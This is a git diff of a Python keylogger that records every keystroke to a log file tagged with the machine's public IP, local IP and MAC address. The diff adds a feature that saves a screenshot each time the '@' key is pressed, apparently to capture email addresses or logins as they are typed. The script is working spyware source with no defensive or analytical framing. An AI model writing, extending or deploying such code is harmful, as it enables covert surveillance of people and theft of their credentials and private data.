@@ -4,11 +4,14 @@ import urllib.request
 import threading
 import socket
 from getmac import get_mac_address as gma
+import pyautogui
+import os
 # external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
 
 deviceip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
+counter = 0
 
 
 def setup_logger(name, log_file, level=logging.INFO):
@@ -38,13 +41,23 @@ keylogger = setup_logger('keyloggerallstrokes', 'keylog.txt')
 
 
 def on_press(key):
+
+
+    global counter 
+
+    print(os.getcwd())
     # print(socket.gethostbyname(socket.gethostname()))
     if(key == Key.esc):
         quit()
 
     print(str(key))
-    # if(str(key) == "'@'"):
-    #     speciallogger.info(str(key))
+    if(str(key) == "'@'"):
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save(r"{0}\screenshot{1}.png".format(os.getcwd(), counter))
+
+        counter+=1
+
+        # speciallogger.info(str(key))
 
     keylogger.info(deviceip+";"+socket.gethostbyname(socket.gethostname())+";"+gma()+";"+str(key))
  
